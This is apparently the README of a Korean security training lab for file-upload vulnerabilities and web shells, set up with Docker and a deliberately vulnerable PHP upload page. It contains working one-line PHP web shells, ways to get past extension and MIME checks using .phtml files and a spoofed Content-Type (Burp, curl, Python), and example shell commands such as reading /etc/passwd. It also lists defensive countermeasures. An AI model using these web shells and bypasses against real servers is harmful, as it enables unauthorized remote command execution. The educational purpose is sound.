# 🎯 웹셸 실습 환경 (Web Shell Practice)

> ⚠️ **경고**: 이 프로젝트는 **교육 목적 전용**입니다. 실제 운영 환경에서는 절대 사용하지 마세요!

## 📋 개요

웹 보안 취약점, 특히 파일 업로드 취약점과 웹셸 공격을 학습하기 위한 실습 환경입니다.
Docker 기반으로 쉽게 구축하고 실습할 수 있습니다.

## 🔧 구성 요소

- **웹 서버**: Nginx
- **애플리케이션**: PHP 8.1 + PHP-FPM
- **컨테이너**: Docker + Docker Compose
- **프로세스 관리**: Supervisor

## 🚀 시작하기

### 필수 요구사항

- Docker
- Docker Compose

### 설치 및 실행

1. **Docker 컨테이너 빌드 및 실행**
   ```bash
   docker-compose up -d --build
   ```

2. **브라우저에서 접속**
   ```
   http://localhost:8080
   ```

3. **컨테이너 중지**
   ```bash
   docker-compose down
   ```

4. **로그 확인**
   ```bash
   docker-compose logs -f
   ```

## 🎓 실습 시나리오

이 환경은 2단계 난이도로 구성되어 있으며, 각 레벨마다 다른 보안 검증이 적용됩니다.

### Level 1 - 초급 (필터링 없음)

**목표**: 기본적인 웹셸 업로드 및 실행

1. **웹셸 준비**
   ```bash
   cp www/sample-webshell.php.txt webshell.php
   ```

2. **업로드**
   - `http://localhost:8080` 접속
   - Level 1 선택
   - webshell.php 업로드

3. **실행**
   ```
   http://localhost:8080/uploads/webshell.php?cmd=ls
   http://localhost:8080/uploads/webshell.php?cmd=whoami
   ```

### Level 2 - 중급 (확장자 + MIME 타입 검증)

**적용된 보안 검증**:
- ❌ `.php` 확장자 차단
- ❌ MIME 타입(Content-Type)에 `php` 문자열 포함 시 차단

**취약점**:
- ✅ `.php5`, `.phtml` 등 다른 PHP 확장자는 허용
- ✅ MIME 타입은 클라이언트에서 조작 가능

**우회 방법**:

1. **웹셸 파일 준비 (.phtml 확장자)**
   ```bash
   # 샘플 파일 사용
   cp www/bypass-samples/level2-phtml.phtml.txt shell.phtml

   # 또는 직접 작성
   echo '<?php system($_GET["cmd"]); ?>' > shell.phtml
   ```

2. **MIME 타입 조작하여 업로드**

   **방법 1: Burp Suite 사용**
   - Burp Suite Proxy 실행
   - 브라우저 프록시 설정 (127.0.0.1:8080)
   - 웹사이트에서 Level 2 선택 후 파일 업로드
   - Burp에서 요청 가로채기 (Intercept)
   - `Content-Type: application/x-httpd-php` 또는 유사한 값을
     `Content-Type: image/jpeg` 또는 `text/plain`으로 변경
   - Forward

   **방법 2: curl 명령 사용**
   ```bash
   curl -X POST \
     -F "level=2" \
     -F "file=@shell.phtml;type=image/jpeg" \
     http://localhost:8080/upload.php
   ```

   **방법 3: Python 스크립트**
   ```python
   import requests

   files = {
       'file': ('shell.phtml', open('shell.phtml', 'rb'), 'image/jpeg')
   }
   data = {'level': '2'}

   response = requests.post('http://localhost:8080/upload.php',
                           files=files, data=data)
   print(response.text)
   ```

3. **업로드 성공 후 실행**
   ```
   http://localhost:8080/uploads/shell.phtml?cmd=ls
   http://localhost:8080/uploads/shell.phtml?cmd=pwd
   http://localhost:8080/uploads/shell.phtml?cmd=whoami
   ```

## 🔓 레벨별 취약점 및 우회 기법

### Level 1 - 초급
**취약점**:
- 모든 파일 확장자 허용
- MIME 타입 검증 없음
- 파일 내용 검증 없음
- 어떤 PHP 파일도 업로드 및 실행 가능

**학습 목표**:
- 기본적인 웹셸 개념 이해
- 파일 업로드 공격의 기초 학습

### Level 2 - 중급
**적용된 검증 (취약)**:
1. `.php` 확장자 차단
2. MIME 타입에 `php` 문자열 포함 시 차단

**취약점**:
- ✅ `.phtml`, `.php5`, `.php3` 등 다른 PHP 확장자는 허용됨
- ✅ MIME 타입은 클라이언트에서 쉽게 조작 가능
- ✅ 파일 내용은 전혀 검증하지 않음

**우회 기법**:
1. **확장자 변경**: `.php` → `.phtml`, `.php5`
2. **MIME 타입 조작**:
   - Burp Suite: Content-Type 헤더를 `image/jpeg` 등으로 변경
   - curl: `-F "file=@shell.phtml;type=image/jpeg"`
   - Python requests: `files = {'file': ('shell.phtml', fp, 'image/jpeg')}`

## 🛠️ 주요 우회 기법

### 1. PHP 실행 가능한 확장자
```
.php     - 기본 PHP 확장자
.phtml   - PHP HTML (많은 서버에서 실행)
.php5    - PHP 5.x 확장자
.php3    - PHP 3.x 확장자
.php4    - PHP 4.x 확장자
```

### 2. MIME 타입 조작 방법

**Burp Suite 사용**:
1. Proxy → Intercept 활성화
2. 브라우저 프록시를 127.0.0.1:8080으로 설정
3. 파일 업로드 시도
4. Burp에서 `Content-Type:` 헤더 수정
5. Forward

**curl 사용**:
```bash
curl -X POST \
  -F "level=2" \
  -F "file=@shell.phtml;type=image/jpeg" \
  http://localhost:8080/upload.php
```

**Python requests 사용**:
```python
import requests

with open('shell.phtml', 'rb') as f:
    files = {'file': ('shell.phtml', f, 'image/jpeg')}
    data = {'level': '2'}
    response = requests.post('http://localhost:8080/upload.php',
                            files=files, data=data)
    print(response.text)
```

### 3. 간단한 웹셸 예제
```php
<?php system($_GET['cmd']); ?>
```

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

```php
<?php passthru($_GET['cmd']); ?>
```

## 🛡️ 보안 대책 (학습용)

실제 환경에서는 다음과 같은 대책을 적용해야 합니다:

### 1. 파일 확장자 화이트리스트
```php
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$file_extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array(strtolower($file_extension), $allowed_extensions)) {
    die('허용되지 않는 파일 형식입니다.');
}
```

### 2. 파일 내용 검증
```php
// 이미지 파일인 경우
$image_info = getimagesize($_FILES['file']['tmp_name']);
if ($image_info === false) {
    die('유효한 이미지 파일이 아닙니다.');
}
```

### 3. 파일명 무작위화
```php
$new_filename = uniqid() . '.' . $file_extension;
```

### 4. 업로드 디렉토리 실행 권한 제거
```nginx
# nginx 설정
location ~* ^/uploads/.*\.(php|php3|php4|php5|phtml)$ {
    deny all;
}
```

### 5. 파일 저장 위치 변경
- 웹 루트 외부에 파일 저장
- 별도의 파일 서버 사용

## 📁 프로젝트 구조

```
.
├── docker-compose.yml      # Docker Compose 설정
├── Dockerfile              # Docker 이미지 빌드 설정
├── nginx.conf              # Nginx 웹서버 설정
├── supervisord.conf        # 프로세스 관리 설정
├── www/                    # 웹 애플리케이션 디렉토리
│   ├── index.php           # 메인 페이지
│   ├── upload.php          # 파일 업로드 처리
│   ├── sample-webshell.php.txt  # 샘플 웹셸
│   └── uploads/            # 업로드된 파일 저장 디렉토리
└── README.md               # 이 파일
```

## 🧪 테스트 명령어 예제

웹셸 실행 후 사용할 수 있는 명령어들:

```bash
# 현재 디렉토리 확인
?cmd=pwd

# 파일 목록 보기
?cmd=ls -la

# 현재 사용자 확인
?cmd=whoami

# 시스템 정보
?cmd=uname -a

# 파일 내용 보기
?cmd=cat /etc/passwd

# 네트워크 정보
?cmd=ifconfig
```

## ⚠️ 주의사항

1. **교육 목적으로만 사용하세요**
   - 허가받지 않은 시스템에 대한 공격은 불법입니다
   - 본인이 소유하거나 테스트 권한이 있는 시스템에서만 실습하세요

2. **실제 운영 환경에서 사용 금지**
   - 이 코드는 의도적으로 취약하게 만들어졌습니다
   - 실제 서비스에 적용하면 심각한 보안 사고가 발생할 수 있습니다

3. **네트워크 노출 주의**
   - 로컬 환경에서만 실습하세요
   - 공개 네트워크에 노출하지 마세요

## 📚 학습 자료

- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Shell 공격 기법](https://www.acunetix.com/websitesecurity/upload-forms-threat/)

## 🤝 기여

이 프로젝트는 교육 목적으로 만들어졌습니다. 개선 사항이나 추가 학습 시나리오에 대한 제안을 환영합니다.

## 📄 라이선스

교육 목적으로 자유롭게 사용 가능합니다. 단, 악의적인 목적으로 사용하는 것은 금지됩니다.

---

**면책 조항**: 이 프로젝트는 보안 교육 및 연구 목적으로만 제공됩니다. 작성자는 이 코드의 오용으로 인한 어떠한 손해에 대해서도 책임지지 않습니다.
